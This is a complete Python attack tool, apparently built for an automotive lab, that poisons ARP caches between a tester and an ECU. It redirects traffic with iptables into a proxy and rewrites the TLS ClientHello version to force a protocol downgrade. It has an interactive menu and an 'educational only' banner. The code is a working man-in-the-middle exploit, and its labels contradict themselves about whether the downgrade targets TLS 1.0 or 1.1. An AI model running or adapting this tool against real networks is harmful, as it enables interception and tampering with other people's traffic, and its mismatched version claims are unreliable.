#!/usr/bin/env python3
"""
Active ARP MITM + TLS Downgrade Attacker
Actually forwards and modifies packets in real-time
"""

import socket
import struct
import time
import threading
import sys
import os
from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw, sendp, sr1
import ssl
import netifaces

# ==========================================================
# CONFIGURATION
# ==========================================================
CLIENT_IP = "10.0.0.20"     # ecuA (Tester)
SERVER_IP = "10.0.0.10"     # ecuC (ECU)
ATTACKER_IP = "10.0.0.30"   # ecuD (Attacker)

TLS_PORT = 13401
PROXY_PORT_CLIENT = 13402   # Proxy port for client connection
PROXY_PORT_SERVER = 13403   # Proxy port for server connection

# Get MAC addresses
CLIENT_MAC = None
SERVER_MAC = None
ATTACKER_MAC = None

# Attack state
arp_poisoning_active = False
proxy_active = False
downgrade_attempted = False
packets_forwarded = 0
packets_modified = 0

# ==========================================================
# COLORS
# ==========================================================
R = "\033[0m"
RED = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"

# ==========================================================
# HELPERS
# ==========================================================
def info(msg):
    print(f"{C}[INFO]{R} {msg}")

def warn(msg):
    print(f"{Y}[WARN]{R} {msg}")

def attack(msg):
    print(f"{RED}[ATTACK]{R} {msg}")

def success(msg):
    print(f"{G}[SUCCESS]{R} {msg}")

# ==========================================================
# GET MAC ADDRESSES
# ==========================================================
def get_mac(ip):
    """Get MAC address for an IP using ARP"""
    try:
        arp_request = ARP(pdst=ip)
        answered = sr1(arp_request, timeout=2, verbose=0)
        if answered:
            return answered.hwsrc
    except Exception as e:
        warn(f"Error getting MAC for {ip}: {e}")
    return None

def discover_network():
    """Discover MAC addresses of client and server"""
    global CLIENT_MAC, SERVER_MAC, ATTACKER_MAC
    
    info("Discovering network...")
    
    # Get our own MAC
    ifaces = netifaces.interfaces()
    for iface in ifaces:
        if iface.startswith('veth'):
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                if netifaces.AF_LINK in addrs:
                    ATTACKER_MAC = addrs[netifaces.AF_LINK][0]['addr']
                    info(f"Attacker MAC: {ATTACKER_MAC}")
                    break
    
    if not ATTACKER_MAC:
        warn("Could not determine attacker MAC")
        ATTACKER_MAC = "00:00:00:00:00:00"
    
    # Get client MAC
    info(f"Resolving {CLIENT_IP}...")
    CLIENT_MAC = get_mac(CLIENT_IP)
    if CLIENT_MAC:
        success(f"Client MAC: {CLIENT_MAC}")
    else:
        warn(f"Could not resolve client MAC")
    
    # Get server MAC
    info(f"Resolving {SERVER_IP}...")
    SERVER_MAC = get_mac(SERVER_IP)
    if SERVER_MAC:
        success(f"Server MAC: {SERVER_MAC}")
    else:
        warn(f"Could not resolve server MAC")

# ==========================================================
# ARP SPOOFING
# ==========================================================
def arp_spoof(target_ip, target_mac, spoof_ip):
    """Send ARP reply to target, claiming to be spoof_ip"""
    ether = Ether(dst=target_mac, src=ATTACKER_MAC)
    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=ATTACKER_MAC
    )
    packet = ether / arp_response
    sendp(packet, verbose=0)

def arp_restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP table to original values"""
    ether = Ether(dst=target_mac, src=source_mac)
    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    packet = ether / arp_response
    sendp(packet, count=5, verbose=0)

def arp_poison_loop():
    """Continuously poison ARP tables"""
    global arp_poisoning_active
    
    attack("🎭 Starting ARP poisoning...")
    arp_poisoning_active = True
    
    while arp_poisoning_active:
        arp_spoof(CLIENT_IP, CLIENT_MAC, SERVER_IP)
        arp_spoof(SERVER_IP, SERVER_MAC, CLIENT_IP)
        time.sleep(2)
    
    info("Restoring ARP tables...")
    arp_restore(CLIENT_IP, CLIENT_MAC, SERVER_IP, SERVER_MAC)
    arp_restore(SERVER_IP, SERVER_MAC, CLIENT_IP, CLIENT_MAC)
    success("ARP tables restored")

# ==========================================================
# TLS PACKET MODIFICATION
# ==========================================================
def is_tls_client_hello(data):
    """Check if packet is TLS Client Hello"""
    try:
        if len(data) < 6:
            return False
        # TLS Handshake (0x16), followed by handshake type (0x01 = Client Hello)
        return data[0] == 0x16 and data[5] == 0x01
    except:
        return False

def modify_tls_to_v10(data):
    """Modify TLS Client Hello to downgrade to TLS 1.1"""
    global packets_modified, downgrade_attempted
    
    try:
        if len(data) < 11:
            return data
        
        modified = bytearray(data)
        
        # TLS Record Version (bytes 1-2) -> 0x0302 (TLS 1.1)
        modified[1:3] = struct.pack("!H", 0x0302)
        
        # Client Hello Version (bytes 9-10) -> 0x0302 (TLS 1.1)
        modified[9:11] = struct.pack("!H", 0x0302)
        
        packets_modified += 1
        downgrade_attempted = True
        attack(f"🔻 DOWNGRADED: TLS 1.2 → TLS 1.1 (packet #{packets_modified})")
        
        return bytes(modified)
    except Exception as e:
        warn(f"Modification failed: {e}")
        return data

def parse_tls_version(data):
    """Parse TLS version from packet"""
    try:
        if len(data) < 11:
            return "Unknown"
        
        version = struct.unpack("!H", data[9:11])[0]
        version_map = {
            0x0301: "TLS 1.0",
            0x0302: "TLS 1.1",
            0x0303: "TLS 1.2",
            0x0304: "TLS 1.3"
        }
        return version_map.get(version, f"Unknown (0x{version:04x})")
    except:
        return "Unknown"

# ==========================================================
# ACTIVE TCP PROXY
# ==========================================================
def forward_data(source, destination, direction, modify=False):
    """Forward data between sockets, optionally modifying TLS"""
    global packets_forwarded, arp_poisoning_active, proxy_active
    
    try:
        while True:
            data = source.recv(4096)
            if not data:
                break
            
            # Check if we should modify this packet
            if modify and is_tls_client_hello(data):
                original_version = parse_tls_version(data)
                info(f"📥 {direction}: Intercepted TLS Client Hello ({original_version})")
                data = modify_tls_to_v10(data)
                
                # Send the modified packet
                destination.send(data)
                packets_forwarded += 1
                
                # Now disconnect MITM to let client reconnect directly
                attack("🔌 Downgrade sent! Disconnecting MITM...")
                attack("🔓 Stopping ARP poisoning...")
                arp_poisoning_active = False
                
                # Wait a moment for ARP to restore
                time.sleep(2)
                
                attack("🔓 Cleaning up iptables...")
                cleanup_iptables()
                
                success("✅ MITM disconnected!")
                success("✅ Client will now reconnect directly to server")
                success("✅ Server may accept downgraded TLS 1.0 on next attempt")
                
                # Close both connections
                return
            
            destination.send(data)
            packets_forwarded += 1
            
    except Exception as e:
        pass  # Connection closed

def handle_client_connection(client_socket, client_addr):
    """Handle connection from client, forward to real server"""
    info(f"🔌 Client connected from {client_addr[0]}:{client_addr[1]}")
    
    try:
        # Connect to real server
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((SERVER_IP, TLS_PORT))
        success(f"✅ Connected to real server {SERVER_IP}:{TLS_PORT}")
        
        # Start forwarding threads
        # Client -> Server (modify TLS here)
        client_to_server = threading.Thread(
            target=forward_data,
            args=(client_socket, server_socket, "Client→Server", True),
            daemon=True
        )
        
        # Server -> Client (no modification)
        server_to_client = threading.Thread(
            target=forward_data,
            args=(server_socket, client_socket, "Server→Client", False),
            daemon=True
        )
        
        client_to_server.start()
        server_to_client.start()
        
        client_to_server.join()
        server_to_client.join()
        
    except Exception as e:
        warn(f"Proxy error: {e}")
    finally:
        client_socket.close()
        if 'server_socket' in locals():
            server_socket.close()
        info(f"❌ Connection closed from {client_addr[0]}")

def start_tcp_proxy():
    """Start TCP proxy to intercept and modify traffic"""
    global proxy_active
    
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((ATTACKER_IP, TLS_PORT))
    proxy_socket.listen(5)
    
    success(f"🔧 TCP Proxy listening on {ATTACKER_IP}:{TLS_PORT}")
    info("Waiting for client connections...")
    proxy_active = True
    
    while proxy_active:
        try:
            client_sock, client_addr = proxy_socket.accept()
            threading.Thread(
                target=handle_client_connection,
                args=(client_sock, client_addr),
                daemon=True
            ).start()
        except Exception as e:
            if proxy_active:
                warn(f"Accept error: {e}")

# ==========================================================
# IPTABLES REDIRECT
# ==========================================================
def setup_iptables_redirect():
    """Setup iptables to redirect traffic to our proxy"""
    info("Setting up iptables redirect rules...")
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Redirect traffic destined for SERVER_IP:TLS_PORT to our proxy
    # PREROUTING: Intercept packets before routing decision
    cmd = f"iptables -t nat -A PREROUTING -p tcp -d {SERVER_IP} --dport {TLS_PORT} -j DNAT --to-destination {ATTACKER_IP}:{TLS_PORT}"
    os.system(cmd)
    success(f"Redirecting {SERVER_IP}:{TLS_PORT} → {ATTACKER_IP}:{TLS_PORT}")
    
    # POSTROUTING: Make sure replies come back to us
    cmd = f"iptables -t nat -A POSTROUTING -p tcp -d {ATTACKER_IP} --dport {TLS_PORT} -j MASQUERADE"
    os.system(cmd)
    
    success("IP forwarding and NAT rules configured")

def cleanup_iptables():
    """Clean up iptables rules"""
    info("Cleaning up iptables...")
    os.system(f"iptables -t nat -D PREROUTING -p tcp -d {SERVER_IP} --dport {TLS_PORT} -j DNAT --to-destination {ATTACKER_IP}:{TLS_PORT} 2>/dev/null")
    os.system(f"iptables -t nat -D POSTROUTING -p tcp -d {ATTACKER_IP} --dport {TLS_PORT} -j MASQUERADE 2>/dev/null")
    success("iptables rules removed")

# ==========================================================
# ATTACK SCENARIOS
# ==========================================================
def scenario_active_mitm():
    """Active MITM with packet modification"""
    info("\n" + "="*60)
    info("SCENARIO: Active MITM + TLS Downgrade")
    info("="*60)
    info("This will:")
    info("  1. Poison ARP cache (client thinks attacker is server)")
    info("  2. Run TCP proxy on attacker")
    info("  3. Intercept TLS Client Hello")
    info("  4. Modify TLS 1.2 → TLS 1.1")
    info("  5. Forward modified packet to server")
    info("  6. Disconnect MITM, let client reconnect with TLS 1.1")
    info("")
    
    input(f"{Y}Press ENTER to start active attack...{R}")
    
    # Setup
    setup_iptables_redirect()
    
    # Start ARP poisoning
    arp_thread = threading.Thread(target=arp_poison_loop, daemon=True)
    arp_thread.start()
    time.sleep(2)
    
    success("✅ ARP poisoning active")
    
    # Start TCP proxy
    proxy_thread = threading.Thread(target=start_tcp_proxy, daemon=True)
    proxy_thread.start()
    time.sleep(1)
    
    success("✅ TCP proxy active")
    info("")
    info("🎯 Attack is LIVE!")
    info("📊 Run the client now and watch Wireshark:")
    info("   - You'll see modified Client Hello (TLS 1.0)")
    info("   - Server will detect downgrade")
    info("   - Connection will fail with TLS Alert")
    info("")
    
    return arp_thread, proxy_thread

# ==========================================================
# MAIN MENU
# ==========================================================
def main_menu():
    """Interactive attack menu"""
    global arp_poisoning_active, proxy_active
    
    threads = []
    
    while True:
        print(f"\n{M}{'='*60}{R}")
        print(f"{M}    ACTIVE MITM + TLS DOWNGRADE ATTACKER{R}")
        print(f"{M}{'='*60}{R}")
        print(f"\n{C}Network Configuration:{R}")
        print(f"  Client (Tester): {CLIENT_IP} [{CLIENT_MAC}]")
        print(f"  Server (ECU):    {SERVER_IP} [{SERVER_MAC}]")
        print(f"  Attacker:        {ATTACKER_IP} [{ATTACKER_MAC}]")
        print(f"\n{C}Status:{R}")
        print(f"  ARP Poisoning: {'🟢 ACTIVE' if arp_poisoning_active else '🔴 INACTIVE'}")
        print(f"  TCP Proxy:     {'🟢 ACTIVE' if proxy_active else '🔴 INACTIVE'}")
        print(f"  Downgrade:     {'🟡 ATTEMPTED' if downgrade_attempted else '⚪ NOT ATTEMPTED'}")
        print(f"\n{C}Statistics:{R}")
        print(f"  Packets Forwarded: {packets_forwarded}")
        print(f"  Packets Modified:  {packets_modified}")
        print(f"\n{Y}Options:{R}")
        print(f"  {B}1{R} - Start Active MITM Attack")
        print(f"  {B}2{R} - Stop Attack")
        print(f"  {B}3{R} - Exit")
        
        choice = input(f"\n{M}Select option:{R} ").strip()
        
        if choice == "1":
            if arp_poisoning_active:
                warn("Attack already running!")
            else:
                threads = scenario_active_mitm()
        
        elif choice == "2":
            if arp_poisoning_active or proxy_active:
                info("Stopping attack...")
                arp_poisoning_active = False
                proxy_active = False
                time.sleep(3)
                cleanup_iptables()
                success("Attack stopped")
            else:
                warn("No attack running")
        
        elif choice == "3":
            if arp_poisoning_active or proxy_active:
                info("Stopping attacks and cleaning up...")
                arp_poisoning_active = False
                proxy_active = False
                time.sleep(3)
                cleanup_iptables()
            info("Goodbye!")
            break
        
        else:
            warn("Invalid option")

# ==========================================================
# MAIN
# ==========================================================
if __name__ == "__main__":
    print(f"{RED}")
    print("="*60)
    print("    ⚠️  ACTIVE MITM + TLS DOWNGRADE ATTACKER ⚠️")
    print("="*60)
    print(f"{R}")
    print(f"{Y}WARNING: This tool is for educational purposes only!{R}")
    print(f"{Y}Only use in controlled lab environments.{R}")
    print("")
    
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{RED}ERROR: This script must be run as root!{R}")
        print(f"Use: sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    # Discover network
    discover_network()
    
    if not CLIENT_MAC or not SERVER_MAC:
        print(f"{RED}ERROR: Could not discover network topology{R}")
        print(f"Make sure client and server are running")
        sys.exit(1)
    
    # Start attack interface
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Y}Caught Ctrl+C, cleaning up...{R}")
        arp_poisoning_active = False
        proxy_active = False
        time.sleep(3)
        cleanup_iptables()
        print(f"{G}Done!{R}")